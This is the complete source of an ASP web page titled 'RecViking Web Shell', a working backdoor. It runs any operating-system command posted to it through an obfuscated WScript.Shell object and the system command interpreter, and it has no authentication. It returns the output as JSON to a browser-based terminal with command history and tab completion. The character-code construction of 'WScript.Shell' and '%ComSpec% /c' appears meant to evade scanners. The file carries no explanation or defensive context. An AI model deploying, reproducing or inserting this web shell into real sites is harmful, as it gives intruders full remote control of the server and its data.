<%
Server.ScriptTimeout = 180
Dim sr, srtmp, er, c, t, cr, cr2, prewin, prelin, pre, f, cwd, a5, cdcmd, pwdcmd

Try
	a5 = CreateObject(chr(86+1) & chr(84-1) & chr(98+1) & chr(110+4) & chr(105) & chr(112) & chr(112+4) & chr(49-3) & chr(83) & chr(104) & chr(106-5) & chr(103+5) & chr(108))
Catch e as Exception
	response.Status = "500 Error"
	response.write("Failed to create scripting environment.")
	Response.End
End Try

f = Server.CreateObject("Scripting.FileSystemObject")

prewin = chr(37) & chr(67) & chr(111) & chr(109) & chr(83) & chr(112) & chr(101) & chr(99) & chr(37) & chr(32) & chr(47) & chr(99) & chr(32)
prelin = "/usr/bin/bash -c"
pre = prewin
cr = a5.Exec(pre & "cd")
cwd = cr.StdOut.Readall()
pwdcmd = " & cd"
if f.FolderExists("C:\") <> true then
	cr = a5.Exec(pre & "pwd")
	cwd = cr.StdOut.Readall()
	pre = prelin
	cr = a5.Exec(pre & "pwd")
	cwd = cr.StdOut.Readall()
	pwdcmd = " ; pwd"
end if

cwd = replace(replace(cwd, chr(13), ""), chr(10), "")

if Request.Form("c") <> "" then
	if Request.Form("cwd") <> "" then
		cwd = Request.Form("cwd")
	end if
	cdcmd = "cd """ & cwd & """ & "
	c = Request.Form("c")
	Response.ContentType = "application/json"
	Try
		cr = a5.Exec(pre & cdcmd & c & pwdcmd)
		sr = trim(cr.StdOut.Readall())
		er = trim(cr.StdErr.Readall())
		if er = "" then
			if right(sr, 1) = chr(10) OR right(sr, 1) = chr(13) then
				sr = left(sr, len(sr) - 1)
				if right(sr, 1) = chr(10) OR right(sr, 1) = chr(13) then
					sr = left(sr, len(sr) - 1)
				end if
			end if
			cwd = Mid(sr, InStrRev(sr, chr(10)) + 1)
			sr = left(sr, len(sr) - len(cwd))
			if right(sr, 1) = chr(10) OR right(sr, 1) = chr(13) then
				sr = left(sr, len(sr) - 1)
				if right(sr, 1) = chr(10) OR right(sr, 1) = chr(13) then
					sr = left(sr, len(sr) - 1)
				end if
			end if
		end if
		response.write ("{""stdout"":""" & replace(replace(replace(replace(replace(sr,"""","\"""),chr(13),"\r"),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """stderr"":""" & replace(replace(replace(replace(replace(er,"""","\"""),chr(13),"\r"),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """error"":null, " & chr(13) & " ""cmd"":""" & replace(replace(replace(replace(replace(pre & cdcmd & c & pwdcmd,"\","\\"),"""","\"""),chr(13),"\r"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & " ""cwd"":""" & replace(replace(replace(replace(replace(cwd,"\","\\"),"""","\"""),chr(13),"\r"),chr(9),"\t"),chr(10),"\n") & """}")
	Catch e As Exception
		response.write ("{""error"":""" & replace(replace(replace(replace(replace(e.Message,"""","\"""),chr(13),"\r"),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """stdout"":""" & replace(replace(replace(replace(replace(sr,"""","\"""),chr(13),"\r"),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """stderr"":""" & replace(replace(replace(replace(replace(er,"""","\"""),chr(13),"\r"),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """error"":null," & chr(13) & " ""cmd"":""" & replace(replace(replace(replace(replace(pre & cdcmd & c & pwdcmd,"\","\\"),"""","\"""),chr(13),"\r"),chr(9),"\t"),chr(10),"\n") & """," &chr(13) & " ""cwd"":""" & replace(replace(replace(replace(replace(cwd,"\","\\"),"""","\"""),chr(13),"\r"),chr(9),"\t"),chr(10),"\n") & """}")
	End Try
else if Request.Form("t") <> "" then
	if Request.Form("cwd") <> "" then
		cwd = Request.Form("cwd")
	end if
	cdcmd = "cd """ & cwd & """ & "
	
	t = split(Request.Form("t")," ")

	
	Response.ContentType = "application/json"
	Try
		for i = UBound(t) to 0 step -1
			dim tmpt
			tmpt = ""
			for z = i to UBound(t) step 1
				tmpt = tmpt & " " & t(z)
			next
			c = "dir /B " & chr(34) & trim(tmpt) & "*" & chr(34)
			cr = a5.Exec(pre & cdcmd & c)
			srtmp = trim(cr.StdOut.Readall())
			er = trim(cr.StdErr.Readall())
			if er = "" then
				sr = sr & chr(10) & replace(srtmp, chr(13), "")
			end if
		next
		sr = replace(sr, chr(10) & chr(10), chr(10))
		sr = replace(sr, chr(10) & chr(10), chr(10))

		if sr <> "" then
			sr = split(sr,chr(10))
			if UBound(sr) > 0 then	
				for i = 0 to UBound(sr)
					sr(i) = chr(34) & sr(i) & chr(34)
				next
			end if
			sr = "[" & join(sr,",") & "]"
			er = ""
		end if
		sr = replace(sr, """"",", "")
		sr = replace(sr, ",""""", "")
		if er <> "" and sr = "" then
			sr="[]"
		end if
		response.write ("{""stdout"": " & sr & "," & chr(13) & """stderr"":""" & replace(replace(replace(replace(replace(er,"""","\"""),chr(13),"\r"),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """error"":null, " & chr(13) & " ""cmd"":""" & replace(replace(replace(replace(replace(pre & cdcmd & c & pwdcmd,"\","\\"),"""","\"""),chr(13),"\r"),chr(9),"\t"),chr(10),"\n") & """}")
	Catch e As Exception
		response.write ("{""error"":""" & replace(replace(replace(replace(replace(e.Message,"""","\"""),chr(13),""),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """stdout"":""" & replace(replace(replace(replace(replace(sr,"""","\"""),chr(13),"\r"),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """stderr"":""" & replace(replace(replace(replace(replace(er,"""","\"""),chr(13),"\r"),"\","\\"),chr(9),"\t"),chr(10),"\n") & """," & chr(13) & """error"":null," & chr(13) & " ""cmd"":""" & replace(replace(replace(replace(replace(pre & cdcmd & c & pwdcmd,"\","\\"),"""","\"""),chr(13),"\r"),chr(9),"\t"),chr(10),"\n") & """," &chr(13) & " ""cwd"":""" & replace(replace(replace(replace(replace(cwd,"\","\\"),"""","\"""),chr(13),"\r"),chr(9),"\t"),chr(10),"\n") & """}")
	End Try
else
	dim htmlgui
	htmlgui = "" & _
		"<!doctype html><html lang=en>" & _
		"<head>" & _
		"<meta charset='utf-8'>" & _
		"<meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'>" & _
		"<title>RecViking Web Shell</title>" & _
		"<link rel='stylesheet' href='https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css'>" & _
		"<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script>" & _
		"<script src='https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js'></script>" & _
		"<script>localStorage.setItem('cmdHistory', JSON.stringify([])); localStorage.setItem('cmdCurrent', '');localStorage.setItem('cwd', ''); localStorage.setItem('cmdIndex', 0);</script>" & _
		"<script>function unscrew(inval){var outval; outval = inval.replace(/\\n/gm,String.fromCharCode(10)).replace(/\\r/gm,String.fromCharCode(13)).replace(/\\t/g,String.fromCharCode(9)).replace(/\\\\/g,String.fromCharCode(92));return outval;}</script>" & _
		"<script>function promptCheck() {if (document.getElementById('cmdin').value.charAt(0) != String.fromCharCode(62)){document.getElementById('cmdin').value=String.fromCharCode(62).concat(document.getElementById('cmdin').value);};}</script>" & _
		"<script>function runcmd(cmdVal) {var tmparr = JSON.parse(localStorage.cmdHistory); if(tmparr[tmparr.length - 1] != cmdVal){tmparr.push(cmdVal)}; localStorage.cmdHistory = JSON.stringify(tmparr);localStorage.cmdIndex = 0;localStorage.cmdCurrent = cmdVal; $.post('" & Request.ServerVariables("script_name") & "', {c: cmdVal, cwd: localStorage.cwd}, function(data){if(data['error'] == null){if(data['stdout']){document.getElementById('cmdout').innerHTML += '<pre>' + unscrew(data['stdout']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';} if(data['stderr']){document.getElementById('cmdout').innerHTML += '<pre style=\'color: red;\'>' + unscrew(data['stderr']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';}$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);document.getElementById('cwd').innerHTML = data['cwd'];localStorage.cwd=data['cwd'];}else{document.getElementById('cmdout').innerHTML += '<pre style=\'color: red;\'>' + unscrew(data['error']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}});};</script>" & _
		"<script>function tabcomplete() {var cmdtmp = document.getElementById('cmdin').value.substring(1); $.post('" & Request.ServerVariables("script_name") & "', {t: cmdtmp, cwd: localStorage.cwd}, function(data){if(data['error'] == null && data['stderr'] == ''){if(data['stdout'].length == 1){var str = document.getElementById('cmdin').value.toLowerCase();var str2 = data['stdout'][0].toLowerCase();var lms = '';for(var i = 1;i <= str2.length;i++){var tmpsec = str2.substring(0,i);if(str.includes(tmpsec, str.length - tmpsec.length)){lms = tmpsec;}}document.getElementById('cmdin').value += data['stdout'][0].substring(lms.length);};document.getElementById('cmdout').innerHTML += ""<pre style='color: gray'>"" + data['stdout'] + ""</pre>"";$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}else{document.getElementById('cmdout').innerHTML += ""<pre style='color: gray'>"" +  'tab completion failed: ' + data['error'] + ""</pre>"";$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}});}</script>" & _
		"<style>" & _
		"#mainwin { width: 800px; height: 600px; padding: 0.5em; background-color: black;}" & _
		"#mainwin h3 { text-align: center; margin: 0; }" & _
		"</style>" & _
		"</head>" & _
		"<body>" & _
		"<div id='mainwin'>" & _
		"<h3 class='ui-widget-header'>RecViking Web Shell (<span id='cwd'>" & cwd & "</span>)</h3>" & _
		"<div style='width: 100%; float: left; background-color: black; color: white;'>" & _
		"<div id='cmdout' style='float: left; width: 100%; background-color: black; color: white; height: 560px; overflow-y: scroll; overflow-x: hidden'></div>" & _
		"<input type='text'id='cmdin' style='float: left; background-color: black; color: white; width: 100%; border: 0px; padding 0px;' onchange='promptCheck()' oninput='promptCheck()' value='>'></input>" & _
		"<script>document.getElementById('cmdin').addEventListener('keyup', function(event){if(event.keyCode === 13){var cmdvar=document.getElementById('cmdin').value.substr(1);document.getElementById('cmdout').innerHTML += '<pre>' + document.getElementById('cmdin').value.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';document.getElementById('cmdin').value='>';$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);runcmd(cmdvar);}else if(event.keyCode === 38){if(parseInt(localStorage.cmdIndex) == 0){localStorage.cmdCurrent = document.getElementById('cmdin').value.substr(1);}localStorage.cmdIndex = parseInt(localStorage.cmdIndex) + 1;if(parseInt(localStorage.cmdIndex) <= JSON.parse(localStorage.cmdHistory).length){document.getElementById('cmdin').value = '>' + JSON.parse(localStorage.cmdHistory)[JSON.parse(localStorage.cmdHistory).length - parseInt(localStorage.cmdIndex)];}else{localStorage.cmdIndex = parseInt(localStorage.cmdIndex) - 1;}}else if(event.keyCode === 40){localStorage.cmdIndex = parseInt(localStorage.cmdIndex) - 1;if(parseInt(localStorage.cmdIndex) <= 0){document.getElementById('cmdin').value = '>' + localStorage.cmdCurrent;localStorage.cmdIndex = 0;}else{document.getElementById('cmdin').value = '>' + JSON.parse(localStorage.cmdHistory)[JSON.parse(localStorage.cmdHistory).length - parseInt(localStorage.cmdIndex)];}}});</script>" & _
		"<script>document.getElementById('cmdin').addEventListener('keydown', function(event){if(event.keyCode === 9){event.preventDefault(); tabcomplete();}});</script>" & _
		"</div>" & _
		"</div>" & _
		"</body>"
	response.write(htmlgui)
end if
a5 = nothing
%>